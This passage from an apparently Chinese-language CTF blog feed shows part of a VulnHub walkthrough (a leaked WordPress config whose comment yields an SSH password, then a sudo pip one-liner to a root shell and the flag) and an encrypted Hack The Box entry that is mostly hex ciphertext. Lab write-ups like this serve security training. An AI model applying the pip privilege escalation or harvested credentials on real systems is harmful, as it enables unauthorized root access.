PS7=~~/;uA5)zj~Z%tu&#125;-8UJ&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;LOGGED_IN_KEY&#x27;</span>,    <span class="string">&#x27;7+cns%lA?p60U~*(J,z9zp4w 2%hB1S6jZ0NuUgl(oK,#H6&amp;GL,i@+4m:1w3|-aW&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;NONCE_KEY&#x27;</span>,        <span class="string">&#x27;m5,d=I4 MShd4lU#8F@@oj2cKpc+J[Kp3bRt%Sfuw.%#`oVKzgDMTl5+D[nu,R&lt;K&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;AUTH_SALT&#x27;</span>,        <span class="string">&#x27;sl3w_.&#125;n|M&#123;~D#6,v]U?Kz/,k&amp;oCnn1._|(i3Y|ng7+&lt;-f4Nv7mmR4B&lt;i&gt;!?du#i&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;SECURE_AUTH_SALT&#x27;</span>, <span class="string">&#x27;b&gt;,[La8I5xqchTMvXN-bI8%[)-V[wHjNmj/1jZ_Vnq`q0&lt;|E@6^.8~KpI_#53Rw_&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;LOGGED_IN_SALT&#x27;</span>,   <span class="string">&#x27;v_`E=EA]$UBa.2P|%YV4cl&#125;(c@AVkW$V5959/gQL~a:,O&#125;qfG85Xc4)=xRBux6g?&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;NONCE_SALT&#x27;</span>,       <span class="string">&#x27;TE#Tim,4h|zKYm$he[F%J*4vG&#123;v]VK!jP0sSeBLHp7Mp|P*XJz:=&amp;n&lt;nsfbIFq&gt;a&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/**<span class="comment">#@-*/</span></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * WordPress Database Table prefix.</span><br><span class="line"> *</span><br><span class="line"> * You can have multiple installations <span class="keyword">in</span> one database <span class="keyword">if</span> you give each</span><br><span class="line"> * a unique prefix. Only numbers, letters, and underscores please!</span><br><span class="line"> */</span><br><span class="line"><span class="variable">$table_prefix</span> = <span class="string">&#x27;wp_&#x27;</span>;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * For developers: WordPress debugging mode.</span><br><span class="line"> *</span><br><span class="line"> * Change this to <span class="literal">true</span> to <span class="built_in">enable</span> the display of notices during development.</span><br><span class="line"> * It is strongly recommended that plugin and theme developers use WP_DEBUG</span><br><span class="line"> * <span class="keyword">in</span> their development environments.</span><br><span class="line"> *</span><br><span class="line"> * For information on other constants that can be used <span class="keyword">for</span> debugging,</span><br><span class="line"> * visit the Codex.</span><br><span class="line"> *</span><br><span class="line"> * @link https://codex.wordpress.org/Debugging_in_WordPress</span><br><span class="line"> */</span><br><span class="line">define( <span class="string">&#x27;WP_DEBUG&#x27;</span>, <span class="literal">false</span> );</span><br><span class="line"></span><br><span class="line">/* That<span class="string">&#x27;s all, stop editing! Happy publishing. */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Absolute path to the WordPress directory. */</span></span><br><span class="line"><span class="string">if ( ! defined( &#x27;</span>ABSPATH<span class="string">&#x27; ) ) &#123;</span></span><br><span class="line"><span class="string">        define( &#x27;</span>ABSPATH<span class="string">&#x27;, dirname( __FILE__ ) . &#x27;</span>/<span class="string">&#x27; );</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Sets up WordPress vars and included files. */</span></span><br><span class="line"><span class="string">require_once( ABSPATH . &#x27;</span>wp-settings.php<span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//`Db]f&#123;He3HgO`(z</span></span><br></pre></td></tr></table></figure>

<p>将其中的ra/912391929129连接ssh发现连接不上，再将ra/<code>Db]f&#123;He3HgO</code>(z连接ssh，成功登录，真想说一句what the fuck!!!!!!</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh ra@192.168.1.15</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.1.15 (192.168.1.15)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:YRICww0bKH3fcEIycw4x9iWEv3gF1qtqElE7ecocCn8.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.1.15<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">ra@192.168.1.15&#x27;</span>s password: </span><br><span class="line">Linux wtf 4.19.0-6-amd64 <span class="comment">#1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Thu Nov 21 12:47:56 2019 from 192.168.1.13</span><br><span class="line">ra@wtf:~$ ls</span><br><span class="line">ra@wtf:~$ id</span><br><span class="line">uid=1000(ra) gid=1000(ra) groups=1000(ra),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)</span><br><span class="line">ra@wtf:~$ <span class="built_in">pwd</span></span><br><span class="line">/home/ra</span><br><span class="line">ra@wtf:~$ whoami</span><br><span class="line">ra</span><br><span class="line">ra@wtf:~$ ls -la</span><br><span class="line">total 28</span><br><span class="line">drwxr-xr-x 3 ra   ra   4096 Nov 21 15:04 .</span><br><span class="line">drwxr-xr-x 3 root root 4096 Nov 21 06:45 ..</span><br><span class="line">-rw------- 1 ra   ra    480 Nov 21 15:01 .bash_history</span><br><span class="line">-rw-r--r-- 1 ra   ra    220 Nov 21 06:45 .bash_logout</span><br><span class="line">-rw-r--r-- 1 ra   ra   3526 Nov 21 06:45 .bashrc</span><br><span class="line">drwx------ 3 ra   ra   4096 Nov 21 14:18 .gnupg</span><br><span class="line">-rw-r--r-- 1 ra   ra    807 Nov 21 06:45 .profile</span><br><span class="line">ra@wtf:~$</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ra@wtf:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> ra on wtf:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User ra may run the following commands on wtf:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/pip</span><br></pre></td></tr></table></figure>

<p>发现/usr/bin/pip可以以root用户的权限执行，网上搜索利用方法，传送门<span class="exturl" data-url="aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8v">GTFOBins<i class="fa fa-external-link-alt"></i></span></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub93.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ra@wtf:~$ TF=$(mktemp -d)</span><br><span class="line">ra@wtf:~$ <span class="built_in">echo</span> <span class="string">&quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;<span class="subst">$(tty)</span> &gt;<span class="subst">$(tty)</span> 2&gt;<span class="subst">$(tty)</span>&#x27;)&quot;</span> &gt; <span class="variable">$TF</span>/setup.py</span><br><span class="line">ra@wtf:~$ sudo pip install <span class="variable">$TF</span></span><br><span class="line">Processing /tmp/tmp.FbYhS1oIjc</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="comment"># </span></span><br></pre></td></tr></table></figure>

<p>运行poc后成功提权,然后找到flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">flag.txt</span><br><span class="line"><span class="comment"># cat flag.txt</span></span><br><span class="line">WTF rooted!</span><br><span class="line">haha, well <span class="keyword">done</span>. </span><br><span class="line">You can find me on discord to tell me your opinion about <span class="string">&quot;WTF&quot;</span> -&gt; pwn4magic<span class="comment">#8707</span></span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>帅的掉渣</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub94.jpg"></p>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>Hack-The-Box-walkthrough[blunder]</title>
    <url>/2020/06/05/blunder/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">enter the users.php pass hash</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="990dbe670cf1e4b1a5bccebf7ffac034a86397a52eae9b9d5e7e23427b11e2ad">86a19610413aa6087c9e889da9045bc29e6760c0c0475ab38e840773fee559550be17abacd75cb022342e23840075954c699f44d37996d670f2393cb7bf0a99f4fd1c4f5863ee46954360764de94612e97281dee441caf382c84e94d623d3c38d7b30c088b186aa3d19a00b7e710d10d54d05c888cb72b23f5628577df9cc9853df680323debdd087ebccb3504ccca6b51f12bbd2e4144fe41db27562b221e7559d848512998188d39711ae13a531e3e8a4b3732859128b88673df85b593b4b3c4cc3d1ad9803d9d5758a73a2deba4be76a33be31390d9af700eef8fe5828c9790382e8a67de9b255ccfa87ee3319c9f3b787c1e0c1ff1b69c87e0cf1e8c3d234dd99529fe34838d8d1df11f479bb266559c5cbbbdee659427c9cfaad88cecc529adea5170706edab04c19f6ba78ef9d943d4cd94869be90036fc5999a716c4acd362bec212fc07c67e274369fbe796a34259fb24a2f1a4a5cacf2ae69bc89330e16fee2e33aac5e003ba7dbc61509a5600e153b3e096aef0c0e81c22b319f43a183decb670b6da0cfdabc99e936eafa02aacbbfa01718a6efb493070ea4e9da2587efa04f781c217b5cda9e96af76c32470bebe3889e444818bcbdc10ffaa4a1851ad3fa63966790eca7b6f2a50c3abb9e6bfcde9489fa9741b002fa32c742c86c340f9b9cd20a2d52431c4c7090fbbb0797841e22f975c2baeb672a9e7221f0689d9895e0870900bdd13bc51a3f64a75b29bf856b16a5af1b125edadaec2c27118d404810bd6dbfb625a04610d789be38ef5d344688dd5418616471c7c411bc73aa72aa0801e9aeb0e1ffcb8cc3506eb4a992f0824d4f23949a03e35545e7f726ab0ccc209b70897b08f039663aa586040bd7b74307078bd36b2567a6c2aabb4cf27a4acec1f54e4fa3d60f4ba713870c221c5b463cc065a0cfbfcaab9840d384e101605a946db966ebf01d4247da6c5566212d60dde49210c9c9457d8c313ec6d367e4aec8d0efa4c2675256f5c928a835d74c22ad7056dd8108d7607c26c510638533761f1a11f89461684e0ca5413cb57439d41cdc545d178c49257c4e1f0488cd01b31cdb71f84fc65f48eba8f1c3733c8ab0ee7bd797fc52ee018a08603d318d3f3023e24a48fb4c2b6634d6f7575f610cac68e6ebab55cd44fe95c765628dbf76d2672d433cd63497f81794afb724092ef0c1defb29725abed7be2096dd3980c0be98076c78dc70b10e403fd622a1b0993d36bca503bd7c8fd077832a891990075d597e998c85fd880c6290094b5403a58877e18e8bc59e9a87037d548610ce58ec42605c0729b8fe426b0097710062cdc405a048275f9ee618b5a0fb590a7a875f529f6f9a582ffb6013abc3da1b02b16aed2645559134286316fb568075bbf18756c35826e4a64d9280e23723a16e484d351769bb39df8c9071c64302828236160e6c22acc85930826f73b5be41f5a06f231a702d329eb70847f6861aa950a45ff50f9ed707572d4674ae3d6d31434216822888afaa2b349592accc1a44b83ad1d705554d98109a23aa3840d4454aad7f48dec64d38835b6ae9f4dc5b8425b43ef3da01c7e16b017d8309a2f766b38f5536e5afb223dfbdc9c30e027ad9b60935975ba0e8e2e1f909115fe7000f0318baa672a90b8176a443c5808b78e7cd0f4e75eaf2af846652cd6a387f61771c0129afa3c9c5cee1a86ab8d24f3d47518f348c7d233d101e2c74f771a848f74ef449ebe13cd7e6cf3224130ef7cd9e429b2389fadca98f2569cecb0f75f79c99c8b5d43226936150fc1a8c0dc72f3c7980e6707b581ea1faac3bfa1de3ce8cca673e346b12ac8a2ab3588bdd4d5855bcee12caada8aa699fb755ec857edf8781ff44cb3cc1cb5c17084590c8ed34b85a1801c4f8a345bc2a4e45920dfcb6ae94972ab6d595111ed9a0b494b0241f282ab0c2828b443a292d459505326d58f9ec8edc9d73bf569be4f1630eba09a915a3cc31a5428d2f4c03a51804320f6b578718c4000e0d19391ee250c66c5c96086f541ed3d1a3ea700f90a80cad9472bc4d1071a2fc5c02f0f66e97baa85988708e8283a644b26ea06fdb4a3b4edd9f5aa3d9c40dda8394ef7a4ce3a5d637aff35937d1d42557ea6225567fc77ca1551325f9e877d5f16994eb51912e8838e1a5fee74e3fd215ce347c1645da55859b00b423771c1f5c0688738699fd9a2e3102ab5d0ecad24132a91d6e78acadaa7ca70636e6ea3702ba6634b25b34bda4889054b92ff8f4213a4f658eef7b541eb31f0196e71f6f4780e821bbbd34c9d589bd6d93e1bd848c8989e6699a6f8949da7c337c3a7a284c0c0112b5230de59cfe3706348b8eedb60c30d86065b4fb75d20fcbb3c39068f932059555f375bafe721891490b4cca68608f93e94e637901815f5276941d42c144f7b83585c5ad08ca95a9b378e2bb1a7a42533e93a8335aebc226ce726b5899739c6af98f23c36634be10545f5f375eb7f024fc09338e20bf1b3390f4941410a7fa334037548db14daed58bcfb367db2c75c1da84284f8188d2c82ae3ae18a195e1912c2b399213c31ef10e4eb14a7ec57e2107fd3095a3554d1f5c3d1bc1c0b979b6d1f4c336c0bcb161bcccca47e40345268ae7405f93443a7e09332ab7dac812afd8e0ba53bf99048986f17feaa13130e8aec3fd1618b35a12d3ec182c6ef12b447b8303971fb9b34e023b3bd453928b5e771fd80eec173eca39adb309165fc9e902346154531a9a025a728cdbd10ad4f1f3af54e7f5d04f5549a69138b947918c332c32ac1804cfdd9606831d5c1143c0191c96654c8fd437e22fcde4524638de46fb14f0cae7c354c77d8e6bcddc90bedb7d1df424380cb1f82e86860b0f1c7302f0b9ed46b32ea4e4690471d95ca29bd8730401650b966019e3bf51ff5cff9c21e1b9c6f2c8e45925250fca51a9addb0d5a48121e56d91dda6a20ee98061ad6711a8d46997954e7544349e8f03aaa36c79d5d2741223f22f92eb3e52846d30a296f5829ac29786203ef52a536ed13a9e9ec5c9793184465591db7fee19e431967de80dd91ec81ab7aa9ea709008c9d37680931a13e66ce61a66b639661990ee893870521399f1def2baa31c3315faf59ccccb0bf81180900d775d01e82b25822078e82b567c003e5502fd5e67e9e5ce8e468e835d54303d3b673f2ae0713cf7aa0e20bd282bed8890d3df37b4b754a04f813e66678ed2bab3bdde3065a129c3daeb069a5bb5030aa6eda551f6b37f7944d71786708b6276d2ed645fbd24a5be8ee14f78df1002fd23a8fdf470d332fea01573adf7296131b122438fe520de0ea7f768bfb6423d3c1fc89a8ab6a2f4a136faae647d7f5f85a3abb34e8db269035bf321ab8bf311fa4cf62ac7543ba16a1c0b74694fd24adb726a947a8b84a589280e65d1badf0ede7bec99a44c4a5eef193c3f0162c3ef2b5ccbd9547d4fce74a0d2b5898960229fac35b1976a61abc175c763ccf3fa3d4348095514552f52581116db709bbf0f30967281b2551e747c4b668323207de4353f8f1e7f525203d8b379908e33d4f71cc893c94ff6d703a947059bf0701e7b291635359c236cf09c88b8fe3aa67bf70de436f540d7c1b2915f0a0610d972e85296af82199d74753c425f2c4291366918f6385af0579f9a03efee4667a796ca09bca798d1b3c59b33722aa80333fa54e97076de497f9a7b1c4cc63a0928fc67c64b4a4e8428255feea247e42cac00bd9c3625c45255dd64bb31b2076e89e346e06e34e0cd994255ef450d0dda51f1ed7c00e90a669ceef38594cc16cf63310d2a3a2654d91e08127531421caa12966123348462e560faa39a3d8f614fc660ab83cfe7dbc63deaaec71b94ae21d22c39df9d97ec018a340d73bcfc17a8da4cffe0b4daaf5bc3a61e6cf97c7fb9c7d1c21f1c40561ac4115e1af81801690ce7d94f4acafe064c5a4bb80e82008867b80f1f25959fbe94db482273208f168d247594ae48b0988e18e0d726824fcf7a794d88e2a69544f93f473aa635f3fdc058a13a3386e97a2fc24680db5ba9f049191a3ee9417e924c5fb1280536fe9a9b36bad13aacc6d9f6f2c286899c6c906a6c1ae44d6ca7bbe66546da80bdb35aadb7f31001626d7fc66319412a59b999e4917e6e122fce4145dfe1ed59bc731c6ee1a5127505711201abebc4d4939ece8ad9011e8a4c0075026ed06d768001fef6c74388911f883d64ea6f697b30ba53fb5880bf94bc13f9c98c32a7ef53a0870ba7f54ae1f10e98537537ec7cd76c346e3102cc5d61ab931618779c7350a354ae960f89b14ea9736af612b29488963b1ff627a4fa0953ef537ab9e473504447f7588a4c99f7a93fcc60994a2ca29da6c4fc4e868770f999f4b960f82aa68f26c10cfe8a80942b4a54dee8b77225d78aa5aa9aad4395c31996776ff2592313bc701e56bde1c073d07b24b99b534c1420b93d45e83dce61718d0f6b4b83ffa6dd5ce2dd917ddaa131adf179bce570d0d47c3a99ca96df1a872ae9d2c347c460cbba848ba02b49b7b2c27d80a949f248a18c3ef74683eef7881d23fc8b422907ee04c229c598cce71d0c0cb4ab5a0fbcafcf7ee50c3f66f5d37dde9b000ec7c17efb2304d4163ce9d727cf705c3f2847402244c1b078bc5568a9a62b4656abccb6284b015379539ffbd3c3d352f7f25ea92fc685eca69156f8aaf2f63e67741c3108f5ea2a98e05932153c6f15226a4e1a1e3a893776181de2cb2b45346a51d0cb140d49dc35b847a5db9e0122b3e97560a8aa7a89e1b68513270ce6608a116f7c88566ad1b9f0210ecda61c8b0fc81a249e0f04c2d4428cf05854977db4aeda8240f5118183134b25fc357f08fb5c5668c336f1fdbf63937a844104add48d57142bb9714efc9283e93f061791aa7457ddb8362a4c8b6e96daca10b60e309a8752bdda642ab4dd335fe8f9e744035be5605330ae2978fb265a2ffb205eafb6f84b439e80f1c19f0fbc09f359674cc08304971b19a8e4788f3c99654bfab15e8842eaf39c6b6fc84bbd89540b6222c25262f344aa9e89bc108eff4481e9d4b39b34170f72ee844c8f4c75007de0f8d8f604fe2361a069630337641d24eda30cef9069a41cd53b2852ef07df1ce760a1e58c9b855f1ab2e272dc58c2cc028efd1ff3b27ecbb02bc9b598309ef2a26726f71c46d9811a46e0a477d023b5ec9662f4e0cb8451117ff60a6bc1ac8939e0cd39bea06e6a063a9222ca9fdc1f3a1db4a55549df579debc6c8f7deb69795e483813c19a905de5f3db4f5061f079ed4bf257cb17a6abdab254c55feb991ed279bbdc86dfb3726ae79a0980c8a0296a2cd9ad7690890b697d95ec9e3e433f667e45f4e6b32cbd9a9b1bc11f6c648b5ed26a605d7a82b3f36f53d0f7e5e34918e2b519d1142a63042d9b4c70569644fd3c74c1c440cb1bea77c5c4b1e50ec69ac0304161ca6b0a17fe07e79005eca44352f3ccbc78ed56e4f09bfcf8dd349bde37874c21285eada33b5c5d23ab4de5d8c683066e542305913b1b0aca78b2fa86370dca0fc115ceb9cb1be5f750201b71bcec44c6cc2aff7616523706804edf01079127fd51b058c3e755c847708807e52696dd8a7e5d1b5943e8170712233c2b9de56236b70895d321273914e65679513e101b98738611f0bcf8c16e0e793a8257218ac94683d15124db250b98742d5b277dac76e238f500f4118a7d9e8ed756c856a0a6587a9f8616ffe6d5330a8d233d8c1a200d6e216ae700b23caad979bff79076d92da4c72aa632ab302616ca2b462700219f269cd17f6edfd5ce1b7a163ed706675292674804bb021cb50424da0375f618d42a7b6011db6dd665d470f8270cc0d44d2fd2716c8788f5d0269e98c5784200dae4bd223acdb22e6d75118b1b0eeac3998f7a46cd25ec40138b040fa5925551f14e0371c1c8c5e29eb1fed02c8705f9f2e48d1e2809033f5478e2c1c3e1964d2898583d4278c4fc74ba545792d986b39eea984e269bc9d689086dcba04b4356c02b79ae15a4bd979d9cc2e4e15475233764f2127576478c13e12867b1d5a5783b65bbf2dc9a4e8c74635ba5c46531c921bc7b8763547e4d8425e2f30e11f463356af341e0147c40f23a25af5f067c5908f7c5c2392752a1a84b620fa0ab5f3afbcd09f655ef76e92f48401caadfc28d97b8fb56f6988577c093aea50e65e220e1c59e70ea98156def10ddf4a03d3cecac753aa60783c5e860ce4be94a1601f4149eb9105345ca1683105476b8dd008acae7611e69175dc106c2d0e1bfbdb969c337c92894e03d02d971900daed2283146ce8ad2e9bd95b0da1afd937aaa97adb86198d0a824ff4c5f5001581328cd7c973bb69e09784dc159765262b42eae716db91332a6463f088edc29bb8bbe75f0c35a3c2989671fab5e6b76ccbdaed80579d27eb275602f8892d7ff6fd76f96cac562ddafb5a0180ec6d7022dd79ad3fd07b23645c269718545b21cf14d2edba920e73fa7d8794c7ff48f2cc9ee23ff6de1108e75182c5c4b5f4aac20af83c4296519f90e4f08e4ff577ff1328fb381ebed4166dce98567cae21dc3a094ced856d1a9287290ecb166f6f7ff7938a1421be05c8268a3f78959268ae6fa3ba9d5dd2dc619e419940a96f60d7fc06796c77f58c2c4a7df56aee1c9449969eea7b6f7bb8dfc3d4fab190de183fa21455e3c6b7178da79da2ddba542d7583ce0e3cfbddaebc3d9d858cb012196553997990069f27141733c8ddbd62dee028be734d3296caa5f8e525f9181231d2fc04ebfe9e4b13456818d7c8951470ccbffbf003a94d37941cc5721972f404d4a41c81a53532e84aae0227809c0103a0250d79324a488cf0696b5fd1d5e6be3833d0bfb0e958546d14f68b6318248218d86f66bbeca2eaef285ce642b3d0c20befc57c655ee37c3afef47928030ced515115e581351ec821e10470f2345c0d80d4caf353d60a3f8b9b1e0f59386170d70208874be773f4f0ac8c9436e6f3448a0ba1a20ce336d6b3431b4275684fcee038bca04924fd5ec5ef39ae38eac5d5b71e1c9ab8959ea88f4a1f949fcf8b024c9d39015af9399a0deb85bcafe34e43ee2cc420a3d0882f45723b97c0460903adac0fd77200e681cc3247520be9e227460aea6e370cb291f48eb7348b1dd46a0fc52d7e19cbc82278f2271f61085fb8465d34458c290157bf0134f063ea846ca4c9c712bfa879f96b42ab6a4d5160e58ee3998d65d64fbb2920bfd278becf55fbf0c4026c020a5f178aaeced5699b1f02847d39742e829b1af54f0841eb63e831fe95da2089f42a5a892c11c375855b716c6ef404b142b6cfd4b7fd33e8e618e3ee7c760a8e7d63d2f986df5cafe3b398243b1eff32baa3baa5d25aaff7a8f52a866509a9932ee168daae1246f8fc18ca59d86ec0cbed227da7b0f2e1f8bcab5dd9faacdb3caa40b4e51942e700e5303d604df1bdad4faa5025ce00bae0179373565c0c7372c9750200eb8fd25b227f8176aa4e8b525d0bab2fe53fe8784c180e61480750a9c8dfff2d29617e730ef1445b830779b4f7b74b84675621a689c5064883d750cc8e50594982bbc3b9f18416f0a07f8295a8f9b5a7a85aac556acf49e7b165e61975396d980e3e80e46429135e6db225e5b6452eb5cb32c470bcce95f1ca9fb69919adff0b784c1d7c81f04a21feb99eda5f1f56d5f6f895e56d8d608d723f84726ce29916be5ce2fe9cef6b1867c8b8f9efa79029165f78150752e5033465bb65225cf5e9f53b0f707de7e823e86a297e0152aa1488e6e0bd2a3d7a2b66c1d80dcf340e1f304b3cca2e596dd586acb636fa517b90332d9030ea6f150d127048f0220542c9545357873496dcee4663c620517eee2f375ecefc03a9292da04bd71d33fcc55a45df965cdaf826ac101f88da907817e3603d8d89f477e3df0af3a7d9d335f1ca390b8d18720767186792479bf48a29e5760bacc4d6a475898c3270a271db51f2b1cdba6a45b573a667f1368df5fa84953f50f61bf33a4d56d60b5166972a94da45866ed6bc67dc885ec32fdda4d78d2f7122fedfe438d5e8f0875808473bf2210ddf0bef29679e3e0f92bb558fbeb13afcbf6436fcabee466480bcaae73a4e0a4671ded3a0ec7a85f5e9b91fb128bf78c7e30ebd7df6c09343ffce3314c1e6a07d9783be1389ec90dd09439f607647e519ee178c857d718d97cf18b874711757d0f4dcc39a5af67f48a923ccaa577835e105a46e60174555698d7d78a0f16b1f7c2a2e8670e1d802ed1388a0382980837cef011b144010dc2eb2bb3b3969d6df1a4b84246d892315d972ecce836b461d7da989484c343ec7f2574cdcc314c3d3734d19769c4820d9997e8c42dc4fd2e016bc68dd3767f70c6032c7bbd3df41711342ac3d249f99a20c31386fa4a4bf38903d42567eb2b65bbaa5aae9155ef577375a6f90fb4a5d1d5210d7a711c4f0cb111c5082096e92ebbf5c40ddba339eb515dbe818976e2c0fdd81e53d4d5311e4f1f5d9bd4cddf4b5a630d6342683740085b6b87c754816aa9782043c0a4f8422e2de927d447d4c4e04230d62d43573c80c9b338b3a7c66f44e7bb9a4763b9c5aae30be636e5f1eeff6d4b25e6cae5f823d95de7c26b300c33280d66e2ad655cf680016c1fc9dcb2d3b4e74dbefef7049ddf5855493d65c107b5342daa15711f64c90086ab067279d8de728cc05e02399f635a9579d9bc0aef9780dbde7e329bab25f147509c759f0f95d330c2704451d1d5078ed6a1c0c05f2c722f4a1224a679ce199de88ec87edf6a22b586c4bdf99aa32f76e600571e529f77fe2a5e11dabae1db92b728da1ea7538acba39b8985539d0a902c9114298d6ad7d5a4a093fbf89b00b132043bd09e8160d8a0e8a0ec461e734a0901f8425ab68500627e6915dc85ce99352ad36266a4c62dca87e528beacea71415f266dc8802b6b9b39d7a62f0f7684aa2696493b40f697c3b2aba4be431c4afd407834880d73f31ea70bf2ad00646115677f15b5262d77afc2c7598a7c6883bfc5376cf066ee168d09e18335215efed418db69985603591a347981f1afaf7e3ad17947c799f6df7f89442d53bcc3ca719b7e1d3d77065048dc999818790f9bd36730a12ff2c717cfe563ba976c0ca7c20d0e62d7b964a89eb0208e30ad3bd6c56b3f215983918b33922da8c0579cef134b2bc543917b4308db2ae5a86f1465b4f0f0e6858af91fbf0884a7587a4e380dbd410484c32e5c535604f690df9b6d20b0a753edc39fee56c02110cb3c7d3478b4a7da14a468bfafa153cecb4ac6a060f674141c38ba256ff7c47ed1894b0980151cb2597ac05a991b1247fa47a5f9eb969bf2977eb2e37be1360ea1154e090e8805e02721a51edd9a722dd67bc9c058246809aaf8605020f53d33ed9b6a9204ff957e532619e3eab2ec552be20808facdd9ce9f503ba82b793d7b9131b161aea52cb417b199a41c8a8e4454323e1f01960dc50f6111f051c438a6d38c63464ddfb76248014e42e448cfc19424eb7c3af607ba5d0b17e041fee5ad47928f9bea7f2b095c0d1ec847dcd3badbc5084dba6cbc4ae3a34ba822b2c643143e5388b0dc86d6accfb299e8a4c32107159bb854f75dafdc3931e02a2e1d63c4cc9e4021e8150e8dd19276086f346e5f453084bbb7e8a2c671a1272881fdc7dc8bf99df1210610e0b2bb5a8d0f5efde5df056adb8434e29d8cf43fa29b4a03eb5fa1a8aed5a449ccb37444ad74d5ecc1ff19e0d82c13a0cd8874720c9232960bc429de1958a2d78c2d010cebbc4f795fdd6bc97b0618ca6b0739667f9d98d3f3e30847188740409ed73c07ad4a8a4e4db64e1fa615536f4572d9b45ee712deafe886f15e2ca7ef5d0aa90a12b5c6fb1902148af7d4b275fe8c3315b322690d2d8ab57afecb2a30de3e294723c9227c396b978980e52d255414dbe4d15a0b756f12656d98f39e6298ac429d4a8bb2a6c591b881bafa505d2edf9bc36951520175d934cddaca5f57a261013a34bd519d05da55d25590a0840f3422ce364710d97f1f0c0788cd8eb913c0dc7a3d8b5858a029ad30e36d338c24e76671dc0024560e5a671e7e492b08526849564190db57e1b18d1537d4530bfd9a38d0fc64008013c35e04985d4b993cab76c7b66551b91ac3ba6eee6226fb823f7a2f0f1de10b4975657d3a4df544623c3596217c07907ef3581c79ab1e03ca7080e2e4092979c41db9adb63e370efbe89a597c89bb531539b1b2f37b2c0382d7fe44f0a3e3fc175bebe82b7a836fde2e23eb528d9b80e972e0d58000af2496453eada6e6848ce2047e3db3f449cbb8f110c17eac6cdc253ccd384d17c4666f459cff7cbd605a330ddc59238a66cd40949ddbddb946500c816e85081653ba9d41925b29a12f9e2543c5276c2bcdf7c226ffa0fa23701359b961cbc4792df64cdbf8b16eb5c67f692360098db12bb87e61d479b14c0d5a4f336ba958e9c7330f1b6e6b3d3983f24039aed3bab7cb8008eca8e1ec49d89fdc4f7f17945f75d4d9fb6b8a453806747a19128992093af803fe2fce5e47ea8c77e63755cfc7bb392437048ec2c6c5b192a33c86b5fd707cb67aa3ca9897ca4c1c8b73706eacc6252694d5bae219e61cd35d2cd94c2ea6286148564309983a8ce3a413325c2db8cb9d352804864815079249f724ff950fef6fba55e3fcf5fa2d9abad13c508dda1bb16478a65419e9db0f94ff4246753bf951d89f740e49d83f140f8ef5457fb53188647b1751a6c02215d81cfba5fb0f999a4cda630006c344c5ce933edcc7a27d837d7cb0a58fae0d4b60b4d50f15f0b81d21a9927e8fa7d360205f8f2cc90234521a1184cfcf53f81a54c149a80821de40723847307af12045cb04989a748663afd1a17f68fb4a588a48540193f785ba500d309ee83d0